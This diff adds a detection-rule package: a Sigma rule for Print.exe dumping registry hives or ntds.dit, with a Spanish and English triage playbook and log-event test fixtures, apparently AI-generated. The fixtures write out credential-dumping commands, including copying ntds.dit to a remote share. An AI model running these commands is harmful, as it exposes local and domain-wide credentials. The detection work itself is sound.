@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "2fcda7e2-8c57-4904-86ac-37fc3157e09d",
+    "title": "Sensitive File Dump Via Print.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Ayush Anand (Securityinbits)",
+    "path": "windows/process_creation/proc_creation_win_print_dump_sensitive_files.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_print_dump_sensitive_files.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1003.002",
+      "T1003.003",
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó Print.exe con la opción /D apuntando a una hive del registro (SAM, SECURITY, SYSTEM) o a ntds.dit. Es una forma conocida de copiar estos archivos con un binario firmado de Windows para extraer credenciales sin conexión.",
+      "what_it_detects": "Procesos cuyo Image termina en \\print.exe o cuyo OriginalFileName es Print.EXE, con un CommandLine que incluye /D (o una variante de guion) y una ruta \\config\\SAM, \\config\\SECURITY, \\config\\SYSTEM o \\windows\\ntds\\ntds.dit.",
+      "why_it_matters": "Si se obtienen las hives SAM/SYSTEM se pueden descifrar los hashes locales (T1003.002). Con ntds.dit y SYSTEM se obtienen los hashes de todo el dominio (T1003.003). Usar un binario legítimo de Windows (T1218) ayuda al atacante a pasar desapercibido.",
+      "triage_steps": [
+        "Revise el CommandLine: identifique el destino de /D: (ruta local, carpeta temporal o recurso compartido UNC) y el origen (ruta en vivo o \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy).",
+        "Confirme si el host es un controlador de dominio; si el origen es ntds.dit, trate el caso como un posible compromiso de todo el dominio.",
+        "Analice ParentImage y la cadena de procesos padres: cmd.exe o powershell.exe lanzados desde un servicio web, una herramienta RMM o una sesión remota son muy sospechosos.",
+        "Valide el usuario y el tipo de logon: ¿es una cuenta administrativa esperada y la sesión es interactiva, de RDP o de red?",
+        "En el mismo host (±15 minutos), busque vssadmin, wmic shadowcopy, ntdsutil, diskshadow, reg save o esentutl, que suelen preparar o acompañar el volcado.",
+        "Busque la creación del archivo destino y posibles transferencias posteriores (SMB, HTTP, herramientas de compresión) desde el host o hacia el recurso UNC.",
+        "Revise alertas anteriores para el mismo host, usuario e IP de origen, así como logons con estas credenciales en otros equipos."
+      ],
+      "false_positives": [
+        "Poco probable según la regla. Lo más parecido sería un ejercicio autorizado de red team o de pentest con Print.exe; confírmelo con el responsable del ejercicio.",
+        "Algún script de respaldo o forense mal diseñado que use Print.exe para copiar hives; verifique la autorización y el responsable."
+      ],
+      "response_steps": [
+        "Confirme la actividad con el dueño del host o de la cuenta; si no está autorizada, aísle el endpoint y la sesión del usuario.",
+        "Preserve la evidencia: obtenga el hash del archivo copiado y su ubicación, y recolecte la memoria y los logs antes de eliminar las copias o las shadow copies del atacante.",
+        "Restablezca las credenciales afectadas: administradores locales (SAM) y, si se tomó ntds.dit, las cuentas privilegiadas y krbtgt dos veces de forma controlada.",
+        "Identifique el acceso inicial, elimine la persistencia y vigile el uso de los hashes robados (pass-the-hash, logons anómalos)."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque Print.exe casi nunca tiene un motivo legítimo para copiar hives o ntds.dit, y el éxito de esta acción expone credenciales locales o de todo el dominio."
+    },
+    "en": {
+      "summary": "Print.exe ran with the /D option targeting a registry hive (SAM, SECURITY, SYSTEM) or ntds.dit. Attackers use this signed Windows binary to copy those files for offline credential extraction.",
+      "what_it_detects": "Processes whose Image ends with \\print.exe or whose OriginalFileName is Print.EXE, where CommandLine has /D (or a dash variant) and a \\config\\SAM, \\config\\SECURITY, \\config\\SYSTEM or \\windows\\ntds\\ntds.dit path.",
+      "why_it_matters": "SAM/SYSTEM hives yield local password hashes (T1003.002). ntds.dit plus SYSTEM yields every domain hash (T1003.003). Using a legitimate Windows binary (T1218) helps the attacker blend in.",
+      "triage_steps": [
+        "Read CommandLine: find the /D: destination (local, temp folder or UNC share) and the source (live path or \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy).",
+        "Check whether the host is a domain controller. If the source is ntds.dit, treat this as possible full domain compromise.",
+        "Review ParentImage and the process ancestry. cmd.exe or powershell.exe spawned by a web service, RMM tool or remote session is highly suspicious.",
+        "Validate the user and logon type: is it an expected admin account, and is the session interactive, RDP or network?",
+        "On the same host within +/- 15 minutes, look for vssadmin, wmic shadowcopy, ntdsutil, diskshadow, reg save or esentutl activity.",
+        "Look for creation of the destination file and any follow-up transfer (SMB, HTTP, archiving tools) from the host or to the UNC share.",
+        "Check earlier alerts for the same host, user and source IP, and logons with these credentials on other systems."
+      ],
+      "false_positives": [
+        "The rule rates false positives as unlikely. The closest case is an authorized red team or pentest exercise using Print.exe; confirm it with the engagement owner.",
+        "A badly designed backup or forensic script that copies hives with Print.exe; verify that it is authorized and who owns it."
+      ],
+      "response_steps": [
+        "Confirm the activity with the host or account owner. If it is not authorized, isolate the endpoint and terminate the user's sessions.",
+        "Preserve evidence: hash the copied file and record where it is, and collect memory and logs before you remove attacker copies or shadow copies.",
+        "Reset affected credentials: local admins (SAM). If ntds.dit was taken, also reset privileged accounts and krbtgt twice, in a controlled way.",
+        "Find the initial access, remove persistence and monitor for use of the stolen hashes (pass-the-hash, anomalous logons)."
+      ],
+      "severity_rationale": "High fits because Print.exe has almost no legitimate reason to copy hives or ntds.dit, and if the copy succeeds it exposes local or domain-wide credentials."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Print.exe copies the SAM hive from a volume shadow copy to a public folder",
+        "event": {
+          "EventID": 4688,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\print.exe",
+          "OriginalFileName": "Print.EXE",
+          "CommandLine": "print /D:C:\\Users\\Public\\s.dat \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c print /D:C:\\Users\\Public\\s.dat ..."
+        }
+      },
+      {
+        "description": "Renamed Print.exe (matched by OriginalFileName) dumps ntds.dit from a shadow copy on a domain controller to a UNC share",
+        "event": {
+          "EventID": 1,
+          "Computer": "DC-01.andes.example.com",
+          "User": "ANDES\\svc_helpdesk",
+          "Image": "C:\\ProgramData\\p.exe",
+          "OriginalFileName": "Print.EXE",
+          "CommandLine": "p.exe /D:\\\\198.51.100.20\\share\\n.dit \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\ntds.dit",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate Print.exe use sending a text document to a network printer; no sensitive path",
+        "event": {
+          "EventID": 4688,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\print.exe",
+          "OriginalFileName": "Print.EXE",
+          "CommandLine": "print /D:\\\\printsrv01\\HP-Floor2 C:\\Users\\jperez\\Documents\\report.txt",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "Hive export with reg.exe, a different binary that this rule does not cover (other rules detect it)",
+        "event": {
+          "EventID": 4688,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\reg.exe",
+          "OriginalFileName": "reg.exe",
+          "CommandLine": "reg save HKLM\\SAM C:\\Windows\\System32\\config\\SAM.bak /y",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:57:07+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
